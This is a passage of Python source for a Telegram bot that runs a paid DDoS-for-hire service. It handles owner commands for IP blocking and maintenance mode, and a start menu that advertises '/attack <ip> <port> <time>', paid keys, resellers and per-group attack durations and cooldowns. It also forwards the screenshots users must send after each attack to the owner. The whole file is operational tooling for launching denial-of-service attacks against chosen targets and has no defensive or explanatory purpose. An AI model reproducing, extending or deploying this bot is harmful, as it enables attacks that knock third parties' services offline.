        bot.reply_to(message, "⚠️ Usage: /unblock_ip <ip_prefix>")
        return
    ip_prefix = command_parts[1]
    if remove_blocked_ip(ip_prefix):
        bot.reply_to(message, f"✅ IP Unblocked!\n✅ Prefix: `{ip_prefix}`")
    else:
        bot.reply_to(message, f"❌ `{ip_prefix}` not found!")

@bot.message_handler(commands=["blocked_ips"])
def blocked_ips_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    blocked = get_blocked_ips()
    if not blocked:
        bot.reply_to(message, "📋 Koi IP blocked nahi hai!")
        return
    response = "🚫 BLOCKED IPs\n\n"
    for i, ip in enumerate(blocked, 1):
        response += f"{i}. `{ip}`*\n"
    response += f"\n📊 Total: {len(blocked)}"
    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=["maintenance"])
def maintenance_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        bot.reply_to(message, "⚠️ Usage: /maintenance <message>")
        return
    msg = command_parts[1]
    set_maintenance(True, msg)
    bot.reply_to(message, f"🔧 Maintenance ON!\nMessage: {msg}\n\n/ok to turn off")

@bot.message_handler(commands=["ok"])
def ok_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    if not is_maintenance():
        bot.reply_to(message, "ℹ️ Maintenance already OFF!")
        return
    set_maintenance(False)
    bot.reply_to(message, "✅ Maintenance OFF!\nBot normal hai.")

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    track_bot_user(user_id, message.from_user.username)
    if check_maintenance(message): return
    if check_banned(message): return
    if is_owner(user_id):
        response = f'''👑 Welcome Owner, {user_name}!

🛡️ DDoS: {'ON' if get_ddos_protection() else 'OFF'}
📢 Channel: {'✅ REQUIRED' if get_channel_required() else '❌ NOT REQUIRED'}
📢 Groups: {len(get_approved_groups())}
🔢 Max Slots: {len(get_enabled_apis())}
🎬 Reel Feature: {'ON' if get_reel_enabled() else 'OFF'} ({len(get_reel_list())} reels)
📡 APIs: {len(get_enabled_apis())} enabled

⚡ Private: Max {get_private_max_attack_time()}s | Cooldown {get_private_cooldown()}s
⚡ Groups: Max {get_group_max_attack_time()}s | Cooldown {get_group_cooldown()}s

Use /help for commands.
Use /settings for settings.

⚡ Owner: No feedback required!'''
    elif is_reseller(user_id):
        response = f'''💼 Welcome Reseller, {user_name}!

Use /help to see commands.
🔢 Max Slots: {len(get_enabled_apis())}'''
    else:
        response = f'''👋 Welcome, {user_name}!

🔐 Commands:
• /verify - Check channel
• /redeem <key> - Redeem
• /mykey - Key details
• /status - Attack status
• /attack <ip> <port> <time> - Attack

⚡ Limits:
• Private: Max {get_private_max_attack_time()}s (Key required)
• Groups: Max {get_group_max_attack_time()}s (NO key)
• Private Cooldown: {get_private_cooldown()}s
• Group Cooldown: {get_group_cooldown()}s
• Max Slots: {len(get_enabled_apis())}

📢 Channel: {'REQUIRED' if get_channel_required() else 'NOT REQUIRED'}
🎬 Reels play with every attack!
📸 After attack, send screenshot to enable next attack!

💎 𝗣𝗔𝗜𝗗 𝗞𝗘𝗬 𝗞𝗘 𝗟𝗜𝗬𝗘 𝗗𝗠 𝗞𝗔𝗥𝗢: {PAID_CONTACT}'''
    bot.reply_to(message, response)

@bot.message_handler(content_types=['photo'])
def handle_feedback_photo(message):
    user_id = message.from_user.id
    if user_id == BOT_OWNER:
        return
    fb = get_pending_feedback(user_id)
    if not fb:
        return
    clear_pending_feedback(user_id)
    user_name = message.from_user.first_name
    username = message.from_user.username
    bot.reply_to(message, f"✅ Feedback Received!\n🎯 {fb['target']}:{fb['port']} ⏱️ {fb['duration']}s\n\n⚡ Ab naya attack laga sakte ho!")
    try:
        photo = message.photo[-1]
        file_id = photo.file_id
        owner_msg = f"📸 New Feedback\n👤 {user_name}\n📛 @{username if username else 'N/A'}\n🆔 {user_id}\n🎯 {fb['target']}:{fb['port']}\n⏱️ {fb['duration']}s"
        bot.send_photo(BOT_OWNER, file_id, caption=owner_msg)
    except Exception as e:
        print(f"Feedback forward error: {e}")

@bot.message_handler(content_types=['document', 'video', 'text', 'audio', 'voice', 'sticker'])
def handle_other_feedback(message):
    user_id = message.from_user.id
    if user_id == BOT_OWNER:
        return
    fb = get_pending_feedback(user_id)
    if fb:
        content_type = message.content_type
        if content_type == 'text':
            bot.reply_to(message, f"📸 Send screenshot (photo), not text!\n🎯 {fb['target']}:{fb['port']} ⏱️ {fb['duration']}s")
        else:
            clear_pending_feedback(user_id)
            user_name = message.from_user.first_name
            username = message.from_user.username
            bot.reply_to(message, f"✅ Feedback Received!\n🎯 {fb['target']}:{fb['port']} ⏱️ {fb['duration']}s\n\n⚡ Ab naya attack laga sakte ho!")
            try:
                owner_msg = f"📎 New Feedback\n👤 {user_name}\n📛 @{username if username else 'N/A'}\n🆔 {user_id}\n🎯 {fb['target']}:{fb['port']}\n⏱️ {fb['duration']}s"
                if content_type == 'document':
                    bot.send_document(BOT_OWNER, message.document.file_id, caption=owner_msg)
                elif content_type == 'video':
                    bot.send_video(BOT_OWNER, message.video.file_id, caption=owner_msg)
                elif content_type == 'audio':
                    bot.send_audio(BOT_OWNER, message.audio.file_id, caption=owner_msg)
                elif content_type == 'voice':
                    bot.send_voice(BOT_OWNER, message.voice.file_id, caption=owner_msg)
                elif content_type == 'sticker':
                    bot.send_sticker(BOT_OWNER, message.sticker.file_id)
                    bot.send_message(BOT_OWNER, owner_msg)
                else:
                    bot.send_message(BOT_OWNER, owner_msg)
            except Exception as e:
                print(f"Feedback forward error: {e}")

def load_saved_channels():
    global REQUIRED_CHANNELS, REQUIRED_CHANNEL_USERNAMES
    try:
        saved = get_setting('required_channels', None)
        if saved and isinstance(saved, list) and saved:
            REQUIRED_CHANNELS = saved
            REQUIRED_CHANNEL_USERNAMES = [extract_channel_username(ch) for ch in saved]
            print(f"📢 Loaded {len(REQUIRED_CHANNELS)} required channels from database")
    except Exception as e:
        print(f"Error loading channels: {e}")

load_saved_channels()
protection.enabled = get_ddos_protection()

print("🔥 OGGY BHAI BOT STARTING...")
print(f"📡 Total APIs: {len(get_api_list())}")
print(f"🟢 Enabled APIs: {len(get_enabled_apis())}")
print(f"🛡️ DDoS Protection: {'ON' if get_ddos_protection() else 'OFF'}")
print(f"📢 Channel Required: {'REQUIRED' if get_channel_required() else 'NOT REQUIRED'}")
print(f"📢 Approved Groups: {len(get_approved_groups())}")
print(f"⚡ Private Max Time: {get_private_max_attack_time()}s")
print(f"⚡ Group Max Time: {get_group_max_attack_time()}s")
print(f"⏳ Private Cooldown: {get_private_cooldown()}s")
print(f"⏳ Group Cooldown: {get_group_cooldown()}s")
print(f"🔢 Max Concurrent Slots: {len(get_enabled_apis())}")
print(f"🎬 Reel Feature: {'ON' if get_reel_enabled() else 'OFF'} ({len(get_reel_list())} reels)")
print(f"💎 Paid Contact: {PAID_CONTACT}")
print("=" * 50)

while True:
    try:
        bot.polling(none_stop=True, interval=0, timeout=20)
    except Exception as e:
        print("Polling crashed, restarting...", e)
        time.sleep(3)